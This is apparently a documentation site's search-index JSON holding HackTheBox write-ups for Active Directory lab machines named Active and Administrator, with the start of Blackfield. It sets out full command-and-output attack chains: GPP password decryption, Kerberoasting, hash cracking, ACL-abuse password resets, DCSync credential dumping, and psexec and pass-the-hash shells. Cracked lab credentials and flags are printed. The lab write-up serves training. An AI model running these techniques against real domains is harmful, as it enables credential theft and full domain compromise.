{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p> /infosec \u00b7      /dev \u00b7      /stuff </p>"},{"location":"active/","title":"Active","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"active/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.100  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 15:52 EDT\nNmap scan report for 10.10.10.100\nHost is up (0.041s latency).\nNot shown: 65408 closed tcp ports (reset), 104 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-04 19:52:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\n49166/tcp open  msrpc         Microsoft Windows RPC\n49168/tcp open  msrpc         Microsoft Windows RPC\n\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-05-04T19:53:28\n|_  start_date: 2025-05-04T10:07:23\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT      ADDRESS\n1   41.86 ms 10.10.14.1\n2   43.25 ms 10.10.10.100\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 94.93 seconds\n</code></pre> <p>Scan shares and we can read the <code>Replication</code> share, which is a copy of <code>SYSVOL</code>.</p> <p></p> <p>Download everything inside:</p> <pre><code>$ smbclient -U '' -N  //10.10.10.100/Replication     \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Jul 21 06:37:44 2018\n  ..                                  D        0  Sat Jul 21 06:37:44 2018\n  active.htb                          D        0  Sat Jul 21 06:37:44 2018\n\n                5217023 blocks of size 4096. 277668 blocks available\nsmb: \\&gt; prompt off\nsmb: \\&gt; recurse on\nsmb: \\&gt; mget *\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\n...\ngetting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (22.0 KiloBytes/sec) (average 7.1 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>Search for the word <code>password</code>:</p> <pre><code>$ grep -r password .                                                 \n./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n</code></pre> <p><code>svc_tgs</code>:<code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p> <p>Using <code>gpp-decrypt</code>, decrypt the password:</p> <pre><code>$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n</code></pre> <p>Check the credentials with <code>nxc</code>:</p> <p></p> <p>Execute a Kerberoasting attack</p> <pre><code>$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-05-04 06:08:40.733372             \n\n\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$954c2dd1af1d9abbf9845e070666b8b4$57026dea882c003e542e00d8534ddea461803edcb80d302396ecead8fdcc4a313b3382907b16c1cebaf9fd706d9e58db256b51a99ac415ef8217a9b5419641210b88be1d8a2230e99e2cbd076704ba69d06ba1f2802443c3dae3772189d2fa2af81a5d26d39fd773b17f66be6773f3ac504f1657840a5c99a7283c21b7a834fc3a95a6ca9815c1fba0f12fca66feee064a84623e158f5d52e3ccdafd3cd2279e8cb36bf8ac39cdc21649a95432d09eef07a28664c77e471aa408a20a346623276daa608edf39aebf68e70eecd8b91781e8faca7d69268f54de7f8f1dba25e2d580e588988156b5cb0b2680fe7f3394cd2036045d86651c6dff6bb32e66749a053d018d857e0cac3a9f00d5ef3ab23eee30cb525f30fd93b36d29f0ff050367dd28c041a851404875b986743efc2778618f691932b4cdbab9a53a1ca728b5a944fd805da628e9f915db31738f365761d2bc40889ee5e6110153f2ddbb5cc56ec37342cd99566a5284da7935b6bf81d2cd586367be7283b393b0690c6f119ea73b6695863909db0e84640488d163051fca2d38d84ab1e5778a7f6ebb175b18213dbf64af1dac87c4edb0493f13c39908bc1e240776ece203f4cb6b1f15ed17ea6876a89f02c06407aa4542a6d56d671fbda9587526f43636e4be709f32d464ae703b10e5624e7702fabf02188aee968f4d0e39ee29b34610cb25a8ccc0ffe5ebad92ef0c573868ffc277a6bd52a5ec6ac7c1d3f73d9d1b5854dc17f50cf5967bca5136fb006865fc4ac234fc4d3106551ae573aa5182a5fffee2069cce14744b0473e4d89dbaa1152f299af06a16236c8613e0676f6db22f74a907c0650a0f0671f6419a3627cbe7302a2d627524b8c3b1a8421f9158da85d1443328c302cf363e99a0f2b7b04e97ce4b675f2f18fc90f03e87152fee27cc77d752ba98957420c9865090e11bad0fc7e0740910129b7ee838c6e1688cc3135f8ed9b1d83f8516f247247ec7e27a9c22d9ac09a04da4f340ac98d1493d11bb48da90e59ca2d9af47222c34dcb17bf2591b3e35f82dc542e978badb7bab9cfaf716405905d46a3800b63b36b9f1f1d8c2f4b87a882788ff315e04bea27b6f5347a06ad6f8ba97f221a7fedd370256be50e45f7a032aeda6089a6dd00e13d1bb7818325ae2849a351b5e6f4960b17ab6c000074bc9bce31eca49a926c5bb1334de1a8adb85897c5343e939b7c7df355f128d2d40d6e3fc021b229c5ed5d586bc24b181\n</code></pre> <p>And using <code>hashcat</code>:</p> <pre><code>$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force  \nhashcat (v6.2.6) starting\n...\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$954c2dd1af1d9abbf9845e070666b8b4$57026dea882c003e542e00d8534ddea461803edcb80d302396ecead8fdcc4a313b3382907b16c1cebaf9fd706d9e58db256b51a99ac415ef8217a9b5419641210b88be1d8a2230e99e2cbd076704ba69d06ba1f2802443c3dae3772189d2fa2af81a5d26d39fd773b17f66be6773f3ac504f1657840a5c99a7283c21b7a834fc3a95a6ca9815c1fba0f12fca66feee064a84623e158f5d52e3ccdafd3cd2279e8cb36bf8ac39cdc21649a95432d09eef07a28664c77e471aa408a20a346623276daa608edf39aebf68e70eecd8b91781e8faca7d69268f54de7f8f1dba25e2d580e588988156b5cb0b2680fe7f3394cd2036045d86651c6dff6bb32e66749a053d018d857e0cac3a9f00d5ef3ab23eee30cb525f30fd93b36d29f0ff050367dd28c041a851404875b986743efc2778618f691932b4cdbab9a53a1ca728b5a944fd805da628e9f915db31738f365761d2bc40889ee5e6110153f2ddbb5cc56ec37342cd99566a5284da7935b6bf81d2cd586367be7283b393b0690c6f119ea73b6695863909db0e84640488d163051fca2d38d84ab1e5778a7f6ebb175b18213dbf64af1dac87c4edb0493f13c39908bc1e240776ece203f4cb6b1f15ed17ea6876a89f02c06407aa4542a6d56d671fbda9587526f43636e4be709f32d464ae703b10e5624e7702fabf02188aee968f4d0e39ee29b34610cb25a8ccc0ffe5ebad92ef0c573868ffc277a6bd52a5ec6ac7c1d3f73d9d1b5854dc17f50cf5967bca5136fb006865fc4ac234fc4d3106551ae573aa5182a5fffee2069cce14744b0473e4d89dbaa1152f299af06a16236c8613e0676f6db22f74a907c0650a0f0671f6419a3627cbe7302a2d627524b8c3b1a8421f9158da85d1443328c302cf363e99a0f2b7b04e97ce4b675f2f18fc90f03e87152fee27cc77d752ba98957420c9865090e11bad0fc7e0740910129b7ee838c6e1688cc3135f8ed9b1d83f8516f247247ec7e27a9c22d9ac09a04da4f340ac98d1493d11bb48da90e59ca2d9af47222c34dcb17bf2591b3e35f82dc542e978badb7bab9cfaf716405905d46a3800b63b36b9f1f1d8c2f4b87a882788ff315e04bea27b6f5347a06ad6f8ba97f221a7fedd370256be50e45f7a032aeda6089a6dd00e13d1bb7818325ae2849a351b5e6f4960b17ab6c000074bc9bce31eca49a926c5bb1334de1a8adb85897c5343e939b7c7df355f128d2d40d6e3fc021b229c5ed5d586bc24b181:Ticketmaster1968\n</code></pre> <p><code>administrator</code>:<code>Ticketmaster1968</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"active/#initial-access","title":"Initial Access","text":"<pre><code>$ impacket-psexec administrator:'Ticketmaster1968'@10.10.10.100        \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.10.100.....\n[*] Found writable share ADMIN$\n[*] Uploading file qxjNwBni.exe\n[*] Opening SVCManager on 10.10.10.100.....\n[*] Creating service SCDA on 10.10.10.100.....\n[*] Starting service SCDA.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt; \n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"active/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags:</p> <pre><code>C:\\Users\\SVC_TGS\\Desktop&gt; type user.txt\n16bedad7cf00108e7d8e2f6915c1b507\nC:\\Users\\Administrator\\Desktop&gt; type root.txt\n9728f72dd3bb79cfa49b76a8c8f070e8\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"administrator/","title":"Administrator","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"administrator/#machine-information","title":"Machine Information","text":"<p>As is common in real-life Windows pentests, you will start the <code>Administrator</code> box with credentials for the following account: <code>Olivia</code>:<code>ichliebedich</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"administrator/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.42\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 14:31 CEST\nNmap scan report for 10.10.11.42\nHost is up (0.041s latency).\nNot shown: 64837 closed tcp ports (reset), 672 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-14 19:31:33Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n59383/tcp open  msrpc         Microsoft Windows RPC\n60509/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n60514/tcp open  msrpc         Microsoft Windows RPC\n60521/tcp open  msrpc         Microsoft Windows RPC\n60526/tcp open  msrpc         Microsoft Windows RPC\n60539/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.95%I=7%D=6/14%Time=684D6BB4%P=x86_64-pc-linux-gnu%r(DNS-\nSF:SD-TCP,30,\"\\0\\.\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04\nSF:_udp\\x05local\\0\\0\\x0c\\0\\x01\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n</code></pre> <p>Checking the provided credentials, we have access via <code>winrm</code>.</p> <p></p> <p>Add <code>administrator.htb</code> to <code>/etc/hosts</code>.</p> <p>Get the domain data with <code>bloodhound-ce-python</code>:</p> <pre><code>$ bloodhound-ce-python -c All -u olivia -p ichliebedich -d administrator.htb -dc administrator.htb -ns 10.10.11.42 --zip\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: administrator.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: administrator.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: administrator.htb\nINFO: Found 11 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc.administrator.htb\nINFO: Done in 00M 08S\nINFO: Compressing output into 20250614153205_bloodhound.zip\n</code></pre> <p>Upload the data to <code>BloodHound</code>.</p> <p></p> <p><code>Olivia</code> has <code>GenericAll</code> over <code>michael</code>, so we can change his password.</p> <pre><code>$ net rpc password \"michael\" \"newP@ssword2022\" -U \"administrator\"/\"olivia\"%\"ichliebedich\" -S \"10.10.11.42\"             10.10.11.42     445    DC               [+] administrator.htb\\michael:newP@ssword2022\n</code></pre> <p>Now <code>michael</code> has <code>ForceChangePassword</code> over <code>benjamin</code>.</p> <p></p> <pre><code>$ net rpc password \"benjamin\" \"newP@ssword2022\" -U \"administrator\"/\"michael\"%\"newP@ssword2022\" -S \"10.10.11.42\"\n</code></pre> <p>Log into the <code>ftp</code> with <code>benjamin</code> and get <code>Backup.psafe3</code>.</p> <p></p> <p>Using <code>pwsafe2john</code> and <code>john</code>, crack the password.</p> <pre><code>$ pwsafe2john Backup.psafe3 &gt; hash\n</code></pre> <p></p> <p>Using the command <code>pwsafe</code>, open the backup file and enter the password.</p> <p></p> <p>Get each password and put it in a <code>passwords</code> file to spray them.</p> <p></p> <p>Make a users list too.</p> <pre><code>$ rpcclient -U 'olivia%ichliebedich'  //10.10.11.42 -c enumdomusers | awk -F[][] '{print $2}' &gt; users\n</code></pre> <p>With <code>nxc</code>, check all combinations.</p> <p></p> <p><code>emily</code>:<code>UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p> <p><code>Emily</code> has <code>GenericWrite</code> over <code>ethan</code>.</p> <p></p> <p>And <code>ethan</code> can <code>DCSync</code> the domain.</p> <p></p> <p>So we can perform a targeted Kerberoast on <code>ethan</code>.</p> <pre><code>$ python targetedKerberoast/targetedKerberoast.py -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --request-user ethan\n[*] Starting kerberoast attacks\n[*] Attacking user (ethan)\n[+] Printing hash for (ethan)\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5924e375c523e6d982e8be22da4d4149$833bb3618f58915c0f55ed4937e33485a2d4414708e2b5a487647814ef78c74e354b190c6286ef6d3b00a2cdc9153835263ba93b554e1679f731a2f40495b8ebaf8cbd48a668e2acab673047f9f8740b2af9c58d0232ae6cd17822675734fd52e3ea3c10106a4846768ee8d57b4be9e8a47cb6d1cf586dc35cda4c5d595f5f06c76ae64181d38ceb53b91d5019db5331b34bded3078cfc964cf905d745ed4cb143ea6255685d8e728936f7a3ba309a084589d4ae4d230382024410997e0cc52b24bdd9aeb57f7d24d936761902b51ccf4f1bba985deba5f12ae2654f7d90be86078886a5f2933aaf7f2e21131757b2e0653c9272b960393fc0f1f053d84f9810b675d070ddaf7a662e73c1eb04bc39df22f20cd8041fdfebadeb241a275d39013f7dcdb8b67fec87ae83d7e3292e30c177be799ace015d6e7f23699d35494ef3e62aaa47314bc721111fd6bccd206400fc9d8cd5f0a2337512ae0de9ccf014357d0619bfdc402885112e9f611bb39b19ebb27490107c828ca90269618461942ebebe69f7c5b9eb81bfa253602777db0195d11f3c1001bf8eed33fad8e1cb4dd967eec4aa6907918ff69d3aa343afc6a7571245c00ff3d865bdcbb20f4723543f90ec0e41858bed5953795e09c95c9d81f40e2d55e16d9da686a3bd325dd1c584e899658759d18c1c97a1cbc92dbb071ee1b534faf3416d699b0e55c3f81ec0cb9379921a14a9179ac1412d262475ed39b0747bfbd8c87162fc2db4f05e8e8f29825aff554faafccf616a7a5d81c1092de257be186fbaf2a8d76c0a48e0504788ecff37e01f7cae79423853bc0a490a37a94c6ac235c6c60e1afd3df6b0d84b806893abf0a06cfe3a9c583f164ba9e21c39e36c48127effe578e4bee41517ed459fec61a5a044c9a9a934a8fd3dc30ba4b58645dfd8a9409c24e2909f319375ab3caac4b70a40ecc87c323a60cec1d0a337d2b779e731f10a24608cc54833d307c9ff3706b27d91e7d4b0e5d92b59fe31e860d06ecfffe002bb97d3637e79e1da7a6788d9255fb4d93c2045e0ec445148c4eac0e4a86164dfbd6bb19992f62e4bab1733f6df81046b413c7acd4e4914d8d70291c1476fa4c0222e2c710b7b4e9cfc605c27027eaa186eb2ef52657b781f95aa2cc89eb6c8b29018257f958498fd2925369d0ad6fe5ed767cc7fe03bbdec69a7d7eccaa7fcd4b463f6a88cb1c30b61dd4ed148325e51e1b630a794a5e925a239d0d460726fefe06f8b8bb5289231d21c3fd52bc81ae5203da74be6a743750e679079b4519da3c6bed15afe2cb6d077b8bd455e85c5d7ccb436820098a8f8d9dca683ec4b79b0a94906641a861c31780513654edfea42119345d12cf271a286473114766408e1a40492e9afda844d22b28dc3f4edfee79d56e12f291e29dab49cef3f1e77306a0d172bc58bcf46fa126421f2b15d47536b4c9c968d96dd2b480d2405b02a401f67addc0209fedc80048a1be5283cd56a229fcdc2c6f35d5b6b62ded790b8a9a440d9746f24ee47:limpbizkit\n...\n</code></pre> <p>And using <code>hashcat</code>, crack it.</p> <pre><code>$ hashcat -m 13100 hash /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt --force \nhashcat (v6.2.6) starting\n\n...\n\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5924e375c523e6d982e8be22da4d4149$833bb3618f58915c0f55ed4937e33485a2d4414708e2b5a487647814ef78c74e354b190c6286ef6d3b00a2cdc9153835263ba93b554e1679f731a2f40495b8ebaf8cbd48a668e2acab673047f9f8740b2af9c58d0232ae6cd17822675734fd52e3ea3c10106a4846768ee8d57b4be9e8a47cb6d1cf586dc35cda4c5d595f5f06c76ae64181d38ceb53b91d5019db5331b34bded3078cfc964cf905d745ed4cb143ea6255685d8e728936f7a3ba309a084589d4ae4d230382024410997e0cc52b24bdd9aeb57f7d24d936761902b51ccf4f1bba985deba5f12ae2654f7d90be86078886a5f2933aaf7f2e21131757b2e0653c9272b960393fc0f1f053d84f9810b675d070ddaf7a662e73c1eb04bc39df22f20cd8041fdfebadeb241a275d39013f7dcdb8b67fec87ae83d7e3292e30c177be799ace015d6e7f23699d35494ef3e62aaa47314bc721111fd6bccd206400fc9d8cd5f0a2337512ae0de9ccf014357d0619bfdc402885112e9f611bb39b19ebb27490107c828ca90269618461942ebebe69f7c5b9eb81bfa253602777db0195d11f3c1001bf8eed33fad8e1cb4dd967eec4aa6907918ff69d3aa343afc6a7571245c00ff3d865bdcbb20f4723543f90ec0e41858bed5953795e09c95c9d81f40e2d55e16d9da686a3bd325dd1c584e899658759d18c1c97a1cbc92dbb071ee1b534faf3416d699b0e55c3f81ec0cb9379921a14a9179ac1412d262475ed39b0747bfbd8c87162fc2db4f05e8e8f29825aff554faafccf616a7a5d81c1092de257be186fbaf2a8d76c0a48e0504788ecff37e01f7cae79423853bc0a490a37a94c6ac235c6c60e1afd3df6b0d84b806893abf0a06cfe3a9c583f164ba9e21c39e36c48127effe578e4bee41517ed459fec61a5a044c9a9a934a8fd3dc30ba4b58645dfd8a9409c24e2909f319375ab3caac4b70a40ecc87c323a60cec1d0a337d2b779e731f10a24608cc54833d307c9ff3706b27d91e7d4b0e5d92b59fe31e860d06ecfffe002bb97d3637e79e1da7a6788d9255fb4d93c2045e0ec445148c4eac0e4a86164dfbd6bb19992f62e4bab1733f6df81046b413c7acd4e4914d8d70291c1476fa4c0222e2c710b7b4e9cfc605c27027eaa186eb2ef52657b781f95aa2cc89eb6c8b29018257f958498fd2925369d0ad6fe5ed767cc7fe03bbdec69a7d7eccaa7fcd4b463f6a88cb1c30b61dd4ed148325e51e1b630a794a5e925a239d0d460726fefe06f8b8bb5289231d21c3fd52bc81ae5203da74be6a743750e679079b4519da3c6bed15afe2cb6d077b8bd455e85c5d7ccb436820098a8f8d9dca683ec4b79b0a94906641a861c31780513654edfea42119345d12cf271a286473114766408e1a40492e9afda844d22b28dc3f4edfee79d56e12f291e29dab49cef3f1e77306a0d172bc58bcf46fa126421f2b15d47536b4c9c968d96dd2b480d2405b02a401f67addc0209fedc80048a1be5283cd56a229fcdc2c6f35d5b6b62ded790b8a9a440d9746f24ee47:limpbizkit\n...\n</code></pre> <p><code>ethan:limpbizkit</code></p> <p><code>Ethan</code> has <code>DCSync</code> over the domain, therefore we can use <code>secretsdump</code> to get the <code>admin</code>'s hash.</p> <pre><code>$ impacket-secretsdump -just-dc-user administrator administrator/ethan:limpbizkit@10.10.11.42\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664\nAdministrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2\nAdministrator:des-cbc-md5:403286f7cdf18385\n[*] Cleaning up... \n</code></pre> <p>Enter with PTH as <code>admin</code>.</p> <pre><code>$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nadministrator\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"administrator/#post-exploitation","title":"Post Exploitation","text":"<p>Get the hashes.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n77db7e094328dedcbc8a140eedf5093f\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Users&gt; type emily\\desktop\\user.txt\ne2a5ed81bf8e3c152ddb3605402bb30e\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"blackfield/","title":"Blackfield","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"blackfield/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.192\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 12:23 CEST\nNmap scan report for 10.10.10.192\nHost is up (0.041s latency).\nNot shown: 65526 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-09 17:23:48Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  tcpwrapped\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.95%I=7%D=5/9%Time=681DD7C3%P=x86_64-pc-linux-gnu%r(DNS-S\nSF:D-TCP,30,\"\\0\\.\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04_\nSF:udp\\x05local\\0\\0\\x0c\\0\\x01\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-05-09T17:24:23\n|_  start_date: N/A\n| 